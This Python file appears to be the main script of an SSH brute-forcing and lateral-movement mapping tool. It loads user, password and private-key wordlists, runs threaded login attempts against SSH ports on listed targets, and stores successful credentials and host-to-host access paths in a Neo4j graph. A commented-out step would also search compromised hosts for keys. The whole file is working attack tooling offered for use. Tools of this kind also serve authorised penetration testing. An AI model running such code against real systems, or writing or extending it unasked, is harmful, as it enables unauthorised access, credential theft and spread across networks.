import argparse
import threading
import os
from modules import bruteforce, graphdb, key_scanner
from modules.logger import sshmap_logger, setup_debug_logging
from config import CONFIG
from queue import Queue
from modules.utils import get_local_info, get_remote_info, read_targets, check_open_port
from modules.credential_store import CredentialStore


# Setup neo4j
graph = graphdb.GraphDB(CONFIG["neo4j_uri"], CONFIG["neo4j_user"], CONFIG["neo4j_pass"])

start_host, start_ips = get_local_info()
ssh_ports = CONFIG["ssh_ports"]
# Max depth for the ssh scan
max_depth = CONFIG["max_depth"]
# Thread-safe function to handle a target
def handle_target(target, maxworkers, credential_store, current_depth, jump=None):
    for port in ssh_ports:
        # We can not check open ports if we are using a jump host, so we just try to connect to all ports
        if current_depth > 1 or check_open_port(target, port):
            sshmap_logger.display(f"[{target}] Port {port} is open, starting bruteforce...")
            results = bruteforce.try_all(target, port, maxworkers, jump, credential_store)
            for res in results:
                if res.ssh_session:
                    #SSHSession object inside res
                    ssh_conn = res.get_ssh_connection()
                    # Add the target to the graph
                    # Get the remote hostname and IPs
                    sshmap_logger.info(f"[{target}:{port}] Get remote hostname and IPs")
                    remote_hostname, remote_ips = get_remote_info(ssh_conn)
                    sshmap_logger.info(f"[{target}:{port}] Add target to database: {res.user}@{target} using {res.method}")
                    sshmap_logger.info(f"[{target}:{port}] Net info target: {remote_hostname} with IPs: {remote_ips}")
                    graph.add_host(remote_hostname, remote_ips)
                    sshmap_logger.info(f"[{target}:{port}] Add SSH connection {start_host}->{remote_hostname} with creds:{res.user}:{res.creds}")
                    graph.add_ssh_connection(from_hostname=start_host, to_hostname=remote_hostname, user=res.user, method=res.method,creds=res.creds,ip=target,port=port)
                    sshmap_logger.success(f"[{target}:{port}] Successfully added SSH connection from {start_host} to {remote_hostname} with user {res.user}")
                    #keys_found = key_scanner.find_keys(ssh_conn)
                    #logger.info(f"[{target}] Keys found: {keys_found}")
                    # Close the SSH connection
                    ssh_conn.close()

def worker(target_queue, maxworkers, credential_store, current_depth):
    """Worker function for threads to process targets from the queue."""
    if current_depth > max_depth:
        sshmap_logger.display(f"Max depth reached in jump {current_depth}, skipping targets.")
        return
    thread_name = threading.current_thread().name
    thread_id = threading.get_ident()
    sshmap_logger.debug(f"Thread {thread_name} (ID: {thread_id}) started")
    while not target_queue.empty():
        target = target_queue.get()
        if target is None:
            break
        sshmap_logger.debug(f"Thread {thread_name} (ID: {thread_id}) - Starting brute force on {target}")
        handle_target(target, maxworkers, credential_store, current_depth)
        target_queue.task_done()

def main():
    parser = argparse.ArgumentParser(description="SSH Bruteforcer with Neo4j logging")
    parser.add_argument("--targets", required=True, help="Path to the file with target IPs")
    parser.add_argument("--users", default="wordlists/users.txt")
    parser.add_argument("--passwords", default="wordlists/passwords.txt")
    parser.add_argument("--credentialspath", default="wordlists/credentials.csv", help="Path to CSV credentials file, will populate users and passwords")
    parser.add_argument("--keys", default="wordlists/keys/", help="Path to SSH private keys")
    parser.add_argument("--threads", type=int, default=4, help="Number of threads to use, one for each target")
    parser.add_argument("--maxworkers", type=int, default=10, help="Number of workers for target")
    parser.add_argument("--debug", action="store_true", help="enable debug level information")
    parser.add_argument("--verbose", action="store_true", help="enable verbose output")



    args = parser.parse_args()
    setup_debug_logging()

    # Initialize credential store
    sshmap_logger.display(f"Using credential store: {args.credentialspath}")
    credential_store = CredentialStore(args.credentialspath)

    targets = read_targets(args.targets)
    sshmap_logger.info(f"Targets {targets}")

    with open(args.users) as f:
        users = [line.strip() for line in f if line.strip()]
    with open(args.passwords) as f:
        passwords = [line.strip() for line in f if line.strip()]
    keyfiles = [os.path.join(args.keys, f) for f in os.listdir(args.keys)]
    # If there are users , we must add lines in credential store with password and keyfile combinations
    if users:
        for user in users:
            for password in passwords:
                credential_store.store("_bruteforce", 22, user, password, "password")
            for keyfile in keyfiles:
                credential_store.store("_bruteforce", 22, user, keyfile, "keyfile")



    # Queue to manage target distribution across threads
    target_queue = Queue()

    sshmap_logger.display(f"Starting attack for: {len(targets)} targets.")
    sshmap_logger.display(f"Threads {args.threads} maxworkers: {args.maxworkers}")
    sshmap_logger.display(f"Keyfiles: {len(keyfiles)}")
    sshmap_logger.display(f"Users: {len(users)}")
    sshmap_logger.display(f"Passwords: {len(passwords)}")
    sshmap_logger.display(f"Max depth: {max_depth}")
    
    # Get info about starting point
    sshmap_logger.info(f"Adding starting point to graph...")
    sshmap_logger.info(f"Starting point: {start_host} with IPs: {start_ips}")
    # Add starting point to the graph
    graph.add_host(start_host, start_ips)

    # Add targets to the queue
    for target in targets:
        sshmap_logger.debug(f"Add target {target} to queue")
        target_queue.put(target)

    # Create and start threads
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(target_queue, args.maxworkers, credential_store, 1), name=f"worker")
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()

    graph.close()
    sshmap_logger.success("All tasks completed.")
    

if __name__ == "__main__":
    main()
